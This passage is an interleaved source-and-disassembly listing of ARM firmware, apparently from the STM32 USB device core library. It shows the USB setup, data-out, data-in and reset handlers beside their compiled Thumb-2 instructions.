0800aef8 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800aef8:	b580      	push	{r7, lr}
 800aefa:	b084      	sub	sp, #16
 800aefc:	af00      	add	r7, sp, #0
 800aefe:	6078      	str	r0, [r7, #4]
 800af00:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800af02:	687b      	ldr	r3, [r7, #4]
 800af04:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800af08:	6839      	ldr	r1, [r7, #0]
 800af0a:	4618      	mov	r0, r3
 800af0c:	f001 f8a7 	bl	800c05e <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800af10:	687b      	ldr	r3, [r7, #4]
 800af12:	2201      	movs	r2, #1
 800af14:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800af18:	687b      	ldr	r3, [r7, #4]
 800af1a:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800af1e:	461a      	mov	r2, r3
 800af20:	687b      	ldr	r3, [r7, #4]
 800af22:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800af26:	687b      	ldr	r3, [r7, #4]
 800af28:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800af2c:	f003 031f 	and.w	r3, r3, #31
 800af30:	2b02      	cmp	r3, #2
 800af32:	d01a      	beq.n	800af6a <USBD_LL_SetupStage+0x72>
 800af34:	2b02      	cmp	r3, #2
 800af36:	d822      	bhi.n	800af7e <USBD_LL_SetupStage+0x86>
 800af38:	2b00      	cmp	r3, #0
 800af3a:	d002      	beq.n	800af42 <USBD_LL_SetupStage+0x4a>
 800af3c:	2b01      	cmp	r3, #1
 800af3e:	d00a      	beq.n	800af56 <USBD_LL_SetupStage+0x5e>
 800af40:	e01d      	b.n	800af7e <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800af42:	687b      	ldr	r3, [r7, #4]
 800af44:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800af48:	4619      	mov	r1, r3
 800af4a:	6878      	ldr	r0, [r7, #4]
 800af4c:	f000 fad4 	bl	800b4f8 <USBD_StdDevReq>
 800af50:	4603      	mov	r3, r0
 800af52:	73fb      	strb	r3, [r7, #15]
      break;
 800af54:	e020      	b.n	800af98 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800af56:	687b      	ldr	r3, [r7, #4]
 800af58:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800af5c:	4619      	mov	r1, r3
 800af5e:	6878      	ldr	r0, [r7, #4]
 800af60:	f000 fb3c 	bl	800b5dc <USBD_StdItfReq>
 800af64:	4603      	mov	r3, r0
 800af66:	73fb      	strb	r3, [r7, #15]
      break;
 800af68:	e016      	b.n	800af98 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800af6a:	687b      	ldr	r3, [r7, #4]
 800af6c:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800af70:	4619      	mov	r1, r3
 800af72:	6878      	ldr	r0, [r7, #4]
 800af74:	f000 fb9e 	bl	800b6b4 <USBD_StdEPReq>
 800af78:	4603      	mov	r3, r0
 800af7a:	73fb      	strb	r3, [r7, #15]
      break;
 800af7c:	e00c      	b.n	800af98 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800af7e:	687b      	ldr	r3, [r7, #4]
 800af80:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800af84:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800af88:	b2db      	uxtb	r3, r3
 800af8a:	4619      	mov	r1, r3
 800af8c:	6878      	ldr	r0, [r7, #4]
 800af8e:	f001 fe13 	bl	800cbb8 <USBD_LL_StallEP>
 800af92:	4603      	mov	r3, r0
 800af94:	73fb      	strb	r3, [r7, #15]
      break;
 800af96:	bf00      	nop
  }

  return ret;
 800af98:	7bfb      	ldrb	r3, [r7, #15]
}
 800af9a:	4618      	mov	r0, r3
 800af9c:	3710      	adds	r7, #16
 800af9e:	46bd      	mov	sp, r7
 800afa0:	bd80      	pop	{r7, pc}

0800afa2 <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800afa2:	b580      	push	{r7, lr}
 800afa4:	b086      	sub	sp, #24
 800afa6:	af00      	add	r7, sp, #0
 800afa8:	60f8      	str	r0, [r7, #12]
 800afaa:	460b      	mov	r3, r1
 800afac:	607a      	str	r2, [r7, #4]
 800afae:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800afb0:	2300      	movs	r3, #0
 800afb2:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800afb4:	7afb      	ldrb	r3, [r7, #11]
 800afb6:	2b00      	cmp	r3, #0
 800afb8:	d16e      	bne.n	800b098 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800afba:	68fb      	ldr	r3, [r7, #12]
 800afbc:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800afc0:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800afc2:	68fb      	ldr	r3, [r7, #12]
 800afc4:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800afc8:	2b03      	cmp	r3, #3
 800afca:	f040 8098 	bne.w	800b0fe <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800afce:	693b      	ldr	r3, [r7, #16]
 800afd0:	689a      	ldr	r2, [r3, #8]
 800afd2:	693b      	ldr	r3, [r7, #16]
 800afd4:	68db      	ldr	r3, [r3, #12]
 800afd6:	429a      	cmp	r2, r3
 800afd8:	d913      	bls.n	800b002 <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800afda:	693b      	ldr	r3, [r7, #16]
 800afdc:	689a      	ldr	r2, [r3, #8]
 800afde:	693b      	ldr	r3, [r7, #16]
 800afe0:	68db      	ldr	r3, [r3, #12]
 800afe2:	1ad2      	subs	r2, r2, r3
 800afe4:	693b      	ldr	r3, [r7, #16]
 800afe6:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800afe8:	693b      	ldr	r3, [r7, #16]
 800afea:	68da      	ldr	r2, [r3, #12]
 800afec:	693b      	ldr	r3, [r7, #16]
 800afee:	689b      	ldr	r3, [r3, #8]
 800aff0:	4293      	cmp	r3, r2
 800aff2:	bf28      	it	cs
 800aff4:	4613      	movcs	r3, r2
 800aff6:	461a      	mov	r2, r3
 800aff8:	6879      	ldr	r1, [r7, #4]
 800affa:	68f8      	ldr	r0, [r7, #12]
 800affc:	f001 f923 	bl	800c246 <USBD_CtlContinueRx>
 800b000:	e07d      	b.n	800b0fe <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b002:	68fb      	ldr	r3, [r7, #12]
 800b004:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b008:	f003 031f 	and.w	r3, r3, #31
 800b00c:	2b02      	cmp	r3, #2
 800b00e:	d014      	beq.n	800b03a <USBD_LL_DataOutStage+0x98>
 800b010:	2b02      	cmp	r3, #2
 800b012:	d81d      	bhi.n	800b050 <USBD_LL_DataOutStage+0xae>
 800b014:	2b00      	cmp	r3, #0
 800b016:	d002      	beq.n	800b01e <USBD_LL_DataOutStage+0x7c>
 800b018:	2b01      	cmp	r3, #1
 800b01a:	d003      	beq.n	800b024 <USBD_LL_DataOutStage+0x82>
 800b01c:	e018      	b.n	800b050 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b01e:	2300      	movs	r3, #0
 800b020:	75bb      	strb	r3, [r7, #22]
            break;
 800b022:	e018      	b.n	800b056 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b024:	68fb      	ldr	r3, [r7, #12]
 800b026:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b02a:	b2db      	uxtb	r3, r3
 800b02c:	4619      	mov	r1, r3
 800b02e:	68f8      	ldr	r0, [r7, #12]
 800b030:	f000 f9d2 	bl	800b3d8 <USBD_CoreFindIF>
 800b034:	4603      	mov	r3, r0
 800b036:	75bb      	strb	r3, [r7, #22]
            break;
 800b038:	e00d      	b.n	800b056 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b03a:	68fb      	ldr	r3, [r7, #12]
 800b03c:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b040:	b2db      	uxtb	r3, r3
 800b042:	4619      	mov	r1, r3
 800b044:	68f8      	ldr	r0, [r7, #12]
 800b046:	f000 f9d4 	bl	800b3f2 <USBD_CoreFindEP>
 800b04a:	4603      	mov	r3, r0
 800b04c:	75bb      	strb	r3, [r7, #22]
            break;
 800b04e:	e002      	b.n	800b056 <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b050:	2300      	movs	r3, #0
 800b052:	75bb      	strb	r3, [r7, #22]
            break;
 800b054:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b056:	7dbb      	ldrb	r3, [r7, #22]
 800b058:	2b00      	cmp	r3, #0
 800b05a:	d119      	bne.n	800b090 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b05c:	68fb      	ldr	r3, [r7, #12]
 800b05e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b062:	b2db      	uxtb	r3, r3
 800b064:	2b03      	cmp	r3, #3
 800b066:	d113      	bne.n	800b090 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b068:	7dba      	ldrb	r2, [r7, #22]
 800b06a:	68fb      	ldr	r3, [r7, #12]
 800b06c:	32ae      	adds	r2, #174	; 0xae
 800b06e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b072:	691b      	ldr	r3, [r3, #16]
 800b074:	2b00      	cmp	r3, #0
 800b076:	d00b      	beq.n	800b090 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b078:	7dba      	ldrb	r2, [r7, #22]
 800b07a:	68fb      	ldr	r3, [r7, #12]
 800b07c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b080:	7dba      	ldrb	r2, [r7, #22]
 800b082:	68fb      	ldr	r3, [r7, #12]
 800b084:	32ae      	adds	r2, #174	; 0xae
 800b086:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b08a:	691b      	ldr	r3, [r3, #16]
 800b08c:	68f8      	ldr	r0, [r7, #12]
 800b08e:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b090:	68f8      	ldr	r0, [r7, #12]
 800b092:	f001 f8e9 	bl	800c268 <USBD_CtlSendStatus>
 800b096:	e032      	b.n	800b0fe <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b098:	7afb      	ldrb	r3, [r7, #11]
 800b09a:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b09e:	b2db      	uxtb	r3, r3
 800b0a0:	4619      	mov	r1, r3
 800b0a2:	68f8      	ldr	r0, [r7, #12]
 800b0a4:	f000 f9a5 	bl	800b3f2 <USBD_CoreFindEP>
 800b0a8:	4603      	mov	r3, r0
 800b0aa:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b0ac:	7dbb      	ldrb	r3, [r7, #22]
 800b0ae:	2bff      	cmp	r3, #255	; 0xff
 800b0b0:	d025      	beq.n	800b0fe <USBD_LL_DataOutStage+0x15c>
 800b0b2:	7dbb      	ldrb	r3, [r7, #22]
 800b0b4:	2b00      	cmp	r3, #0
 800b0b6:	d122      	bne.n	800b0fe <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b0b8:	68fb      	ldr	r3, [r7, #12]
 800b0ba:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b0be:	b2db      	uxtb	r3, r3
 800b0c0:	2b03      	cmp	r3, #3
 800b0c2:	d117      	bne.n	800b0f4 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b0c4:	7dba      	ldrb	r2, [r7, #22]
 800b0c6:	68fb      	ldr	r3, [r7, #12]
 800b0c8:	32ae      	adds	r2, #174	; 0xae
 800b0ca:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b0ce:	699b      	ldr	r3, [r3, #24]
 800b0d0:	2b00      	cmp	r3, #0
 800b0d2:	d00f      	beq.n	800b0f4 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b0d4:	7dba      	ldrb	r2, [r7, #22]
 800b0d6:	68fb      	ldr	r3, [r7, #12]
 800b0d8:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b0dc:	7dba      	ldrb	r2, [r7, #22]
 800b0de:	68fb      	ldr	r3, [r7, #12]
 800b0e0:	32ae      	adds	r2, #174	; 0xae
 800b0e2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b0e6:	699b      	ldr	r3, [r3, #24]
 800b0e8:	7afa      	ldrb	r2, [r7, #11]
 800b0ea:	4611      	mov	r1, r2
 800b0ec:	68f8      	ldr	r0, [r7, #12]
 800b0ee:	4798      	blx	r3
 800b0f0:	4603      	mov	r3, r0
 800b0f2:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b0f4:	7dfb      	ldrb	r3, [r7, #23]
 800b0f6:	2b00      	cmp	r3, #0
 800b0f8:	d001      	beq.n	800b0fe <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b0fa:	7dfb      	ldrb	r3, [r7, #23]
 800b0fc:	e000      	b.n	800b100 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b0fe:	2300      	movs	r3, #0
}
 800b100:	4618      	mov	r0, r3
 800b102:	3718      	adds	r7, #24
 800b104:	46bd      	mov	sp, r7
 800b106:	bd80      	pop	{r7, pc}

0800b108 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b108:	b580      	push	{r7, lr}
 800b10a:	b086      	sub	sp, #24
 800b10c:	af00      	add	r7, sp, #0
 800b10e:	60f8      	str	r0, [r7, #12]
 800b110:	460b      	mov	r3, r1
 800b112:	607a      	str	r2, [r7, #4]
 800b114:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b116:	7afb      	ldrb	r3, [r7, #11]
 800b118:	2b00      	cmp	r3, #0
 800b11a:	d16f      	bne.n	800b1fc <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b11c:	68fb      	ldr	r3, [r7, #12]
 800b11e:	3314      	adds	r3, #20
 800b120:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b122:	68fb      	ldr	r3, [r7, #12]
 800b124:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b128:	2b02      	cmp	r3, #2
 800b12a:	d15a      	bne.n	800b1e2 <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b12c:	693b      	ldr	r3, [r7, #16]
 800b12e:	689a      	ldr	r2, [r3, #8]
 800b130:	693b      	ldr	r3, [r7, #16]
 800b132:	68db      	ldr	r3, [r3, #12]
 800b134:	429a      	cmp	r2, r3
 800b136:	d914      	bls.n	800b162 <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b138:	693b      	ldr	r3, [r7, #16]
 800b13a:	689a      	ldr	r2, [r3, #8]
 800b13c:	693b      	ldr	r3, [r7, #16]
 800b13e:	68db      	ldr	r3, [r3, #12]
 800b140:	1ad2      	subs	r2, r2, r3
 800b142:	693b      	ldr	r3, [r7, #16]
 800b144:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b146:	693b      	ldr	r3, [r7, #16]
 800b148:	689b      	ldr	r3, [r3, #8]
 800b14a:	461a      	mov	r2, r3
 800b14c:	6879      	ldr	r1, [r7, #4]
 800b14e:	68f8      	ldr	r0, [r7, #12]
 800b150:	f001 f84b 	bl	800c1ea <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b154:	2300      	movs	r3, #0
 800b156:	2200      	movs	r2, #0
 800b158:	2100      	movs	r1, #0
 800b15a:	68f8      	ldr	r0, [r7, #12]
 800b15c:	f001 fe34 	bl	800cdc8 <USBD_LL_PrepareReceive>
 800b160:	e03f      	b.n	800b1e2 <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b162:	693b      	ldr	r3, [r7, #16]
 800b164:	68da      	ldr	r2, [r3, #12]
 800b166:	693b      	ldr	r3, [r7, #16]
 800b168:	689b      	ldr	r3, [r3, #8]
 800b16a:	429a      	cmp	r2, r3
 800b16c:	d11c      	bne.n	800b1a8 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b16e:	693b      	ldr	r3, [r7, #16]
 800b170:	685a      	ldr	r2, [r3, #4]
 800b172:	693b      	ldr	r3, [r7, #16]
 800b174:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b176:	429a      	cmp	r2, r3
 800b178:	d316      	bcc.n	800b1a8 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b17a:	693b      	ldr	r3, [r7, #16]
 800b17c:	685a      	ldr	r2, [r3, #4]
 800b17e:	68fb      	ldr	r3, [r7, #12]
 800b180:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b184:	429a      	cmp	r2, r3
 800b186:	d20f      	bcs.n	800b1a8 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b188:	2200      	movs	r2, #0
 800b18a:	2100      	movs	r1, #0
 800b18c:	68f8      	ldr	r0, [r7, #12]
 800b18e:	f001 f82c 	bl	800c1ea <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b192:	68fb      	ldr	r3, [r7, #12]
 800b194:	2200      	movs	r2, #0
 800b196:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b19a:	2300      	movs	r3, #0
 800b19c:	2200      	movs	r2, #0
 800b19e:	2100      	movs	r1, #0
 800b1a0:	68f8      	ldr	r0, [r7, #12]
 800b1a2:	f001 fe11 	bl	800cdc8 <USBD_LL_PrepareReceive>
 800b1a6:	e01c      	b.n	800b1e2 <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b1a8:	68fb      	ldr	r3, [r7, #12]
 800b1aa:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b1ae:	b2db      	uxtb	r3, r3
 800b1b0:	2b03      	cmp	r3, #3
 800b1b2:	d10f      	bne.n	800b1d4 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b1b4:	68fb      	ldr	r3, [r7, #12]
 800b1b6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b1ba:	68db      	ldr	r3, [r3, #12]
 800b1bc:	2b00      	cmp	r3, #0
 800b1be:	d009      	beq.n	800b1d4 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b1c0:	68fb      	ldr	r3, [r7, #12]
 800b1c2:	2200      	movs	r2, #0
 800b1c4:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b1c8:	68fb      	ldr	r3, [r7, #12]
 800b1ca:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b1ce:	68db      	ldr	r3, [r3, #12]
 800b1d0:	68f8      	ldr	r0, [r7, #12]
 800b1d2:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b1d4:	2180      	movs	r1, #128	; 0x80
 800b1d6:	68f8      	ldr	r0, [r7, #12]
 800b1d8:	f001 fcee 	bl	800cbb8 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b1dc:	68f8      	ldr	r0, [r7, #12]
 800b1de:	f001 f856 	bl	800c28e <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b1e2:	68fb      	ldr	r3, [r7, #12]
 800b1e4:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b1e8:	2b00      	cmp	r3, #0
 800b1ea:	d03a      	beq.n	800b262 <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b1ec:	68f8      	ldr	r0, [r7, #12]
 800b1ee:	f7ff fe42 	bl	800ae76 <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b1f2:	68fb      	ldr	r3, [r7, #12]
 800b1f4:	2200      	movs	r2, #0
 800b1f6:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b1fa:	e032      	b.n	800b262 <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b1fc:	7afb      	ldrb	r3, [r7, #11]
 800b1fe:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b202:	b2db      	uxtb	r3, r3
 800b204:	4619      	mov	r1, r3
 800b206:	68f8      	ldr	r0, [r7, #12]
 800b208:	f000 f8f3 	bl	800b3f2 <USBD_CoreFindEP>
 800b20c:	4603      	mov	r3, r0
 800b20e:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b210:	7dfb      	ldrb	r3, [r7, #23]
 800b212:	2bff      	cmp	r3, #255	; 0xff
 800b214:	d025      	beq.n	800b262 <USBD_LL_DataInStage+0x15a>
 800b216:	7dfb      	ldrb	r3, [r7, #23]
 800b218:	2b00      	cmp	r3, #0
 800b21a:	d122      	bne.n	800b262 <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b21c:	68fb      	ldr	r3, [r7, #12]
 800b21e:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b222:	b2db      	uxtb	r3, r3
 800b224:	2b03      	cmp	r3, #3
 800b226:	d11c      	bne.n	800b262 <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b228:	7dfa      	ldrb	r2, [r7, #23]
 800b22a:	68fb      	ldr	r3, [r7, #12]
 800b22c:	32ae      	adds	r2, #174	; 0xae
 800b22e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b232:	695b      	ldr	r3, [r3, #20]
 800b234:	2b00      	cmp	r3, #0
 800b236:	d014      	beq.n	800b262 <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b238:	7dfa      	ldrb	r2, [r7, #23]
 800b23a:	68fb      	ldr	r3, [r7, #12]
 800b23c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b240:	7dfa      	ldrb	r2, [r7, #23]
 800b242:	68fb      	ldr	r3, [r7, #12]
 800b244:	32ae      	adds	r2, #174	; 0xae
 800b246:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b24a:	695b      	ldr	r3, [r3, #20]
 800b24c:	7afa      	ldrb	r2, [r7, #11]
 800b24e:	4611      	mov	r1, r2
 800b250:	68f8      	ldr	r0, [r7, #12]
 800b252:	4798      	blx	r3
 800b254:	4603      	mov	r3, r0
 800b256:	75bb      	strb	r3, [r7, #22]

          if (ret != USBD_OK)
 800b258:	7dbb      	ldrb	r3, [r7, #22]
 800b25a:	2b00      	cmp	r3, #0
 800b25c:	d001      	beq.n	800b262 <USBD_LL_DataInStage+0x15a>
          {
            return ret;
 800b25e:	7dbb      	ldrb	r3, [r7, #22]
 800b260:	e000      	b.n	800b264 <USBD_LL_DataInStage+0x15c>
        }
      }
    }
  }

  return USBD_OK;
 800b262:	2300      	movs	r3, #0
}
 800b264:	4618      	mov	r0, r3
 800b266:	3718      	adds	r7, #24
 800b268:	46bd      	mov	sp, r7
 800b26a:	bd80      	pop	{r7, pc}

0800b26c <USBD_LL_Reset>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Reset(USBD_HandleTypeDef *pdev)
{
 800b26c:	b580      	push	{r7, lr}
 800b26e:	b084      	sub	sp, #16
 800b270:	af00      	add	r7, sp, #0
 800b272:	6078      	str	r0, [r7, #4]
  USBD_StatusTypeDef ret = USBD_OK;
 800b274:	2300      	movs	r3, #0
 800b276:	73fb      	strb	r3, [r7, #15]

  /* Upon Reset call user call back */
  pdev->dev_state = USBD_STATE_DEFAULT;
 800b278:	687b      	ldr	r3, [r7, #4]
 800b27a:	2201      	movs	r2, #1
 800b27c:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  pdev->ep0_state = USBD_EP0_IDLE;
 800b280:	687b      	ldr	r3, [r7, #4]
 800b282:	2200      	movs	r2, #0
 800b284:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->dev_config = 0U;
 800b288:	687b      	ldr	r3, [r7, #4]
 800b28a:	2200      	movs	r2, #0
 800b28c:	605a      	str	r2, [r3, #4]
  pdev->dev_remote_wakeup = 0U;
 800b28e:	687b      	ldr	r3, [r7, #4]
 800b290:	2200      	movs	r2, #0
 800b292:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
  pdev->dev_test_mode = 0U;
 800b296:	687b      	ldr	r3, [r7, #4]
 800b298:	2200      	movs	r2, #0
 800b29a:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
      }
    }
  }
#else

  if (pdev->pClass[0] != NULL)
 800b29e:	687b      	ldr	r3, [r7, #4]
 800b2a0:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b2a4:	2b00      	cmp	r3, #0
 800b2a6:	d014      	beq.n	800b2d2 <USBD_LL_Reset+0x66>
  {
    if (pdev->pClass[0]->DeInit != NULL)
 800b2a8:	687b      	ldr	r3, [r7, #4]
 800b2aa:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b2ae:	685b      	ldr	r3, [r3, #4]
 800b2b0:	2b00      	cmp	r3, #0
 800b2b2:	d00e      	beq.n	800b2d2 <USBD_LL_Reset+0x66>
    {
      if (pdev->pClass[0]->DeInit(pdev, (uint8_t)pdev->dev_config) != USBD_OK)
 800b2b4:	687b      	ldr	r3, [r7, #4]
 800b2b6:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b2ba:	685b      	ldr	r3, [r3, #4]
 800b2bc:	687a      	ldr	r2, [r7, #4]
 800b2be:	6852      	ldr	r2, [r2, #4]
 800b2c0:	b2d2      	uxtb	r2, r2
 800b2c2:	4611      	mov	r1, r2
 800b2c4:	6878      	ldr	r0, [r7, #4]
 800b2c6:	4798      	blx	r3
 800b2c8:	4603      	mov	r3, r0
 800b2ca:	2b00      	cmp	r3, #0
 800b2cc:	d001      	beq.n	800b2d2 <USBD_LL_Reset+0x66>
      {
        ret = USBD_FAIL;
